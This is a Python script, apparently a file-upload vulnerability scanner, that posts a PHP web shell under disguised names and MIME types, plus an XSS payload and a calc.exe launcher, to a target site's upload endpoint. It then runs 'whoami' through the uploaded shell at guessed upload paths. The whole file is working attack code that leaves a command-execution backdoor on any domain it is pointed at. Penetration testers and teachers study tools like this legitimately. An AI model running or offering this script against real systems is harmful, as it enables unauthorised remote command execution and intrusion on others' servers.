import requests

# Payloads to test different types of vulnerabilities
test_files = {
    "xss.html": (
        "xss.html",
        "<script>alert('XSS')</script>",
        "text/html"
    ),
    "shell.php": (
        "shell.php",
        "<?php system($_GET['cmd']); ?>",
        "application/x-php"
    ),
    "shell.jpg": (
        "shell.jpg",
        "<?php system($_GET['cmd']); ?>",
        "image/jpeg"
    ),
    "shell.php.jpg": (
        "shell.php.jpg",
        "<?php system($_GET['cmd']); ?>",
        "image/jpeg"
    ),
    "shell.phtml": (
        "shell.phtml",
        "<?php system($_GET['cmd']); ?>",
        "application/octet-stream"
    ),
    "shell.phar": (
        "shell.phar",
        "<?php system($_GET['cmd']); ?>",
        "application/octet-stream"
    ),
    "calc.py": (
        "calc.py",
        "import os\nos.system('calc.exe')",
        "text/x-python"
    )
}

# Common uploaded file paths
upload_paths = [
    "/uploads/",
    "/upload/",
    "/files/",
    "/user_uploads/",
    "/static/",
    "/images/"
]

def check_file_upload(domain, upload_endpoint):
    url = domain.rstrip('/') + upload_endpoint
    results = []

    for test_file, (filename, content, mime) in test_files.items():
        file = {"file": (filename, content, mime)}

        try:
            response = requests.post(url,files= file, timeout=7)
            if(response.status_code==200):
                this_result = f"{filename} uploaded successfully."
                 
                found = False
                for path in upload_paths:
                    file_url = f"{domain.rstrip('/')}{path}{filename}"
                    status = test_access(file_url)

                    if("Yes" in status):
                        this_result+= "Vulnerability: file executed.\n"
                        found = True
                        break 
                if(found==False):
                    this_result+= "No obvious vulnerability.\n"
                    
                results.append(this_result)

            else:
                results.append(f"{filename} upload unsuccessful with status code = {response.status_code}")    

        except requests.exceptions.RequestException as e:
            results.append(f"[{filename}] Error during upload: {str(e)}")

    return results    

def test_access(url):
    try:
        response = requests.get(url + "?cmd=whoami", timeout=7) 
        if(response.status_code==200):
            rtext = response.text.lower()
            if "windows" in rtext or "root" in rtext or "admin" in rtext:       
                return "Yes"   
            else:
                return "No"

        else:
            return "No"    
        
    except requests.exceptions.RequestException as e:
        return f"Error accessing file: {str(e)}"    
                

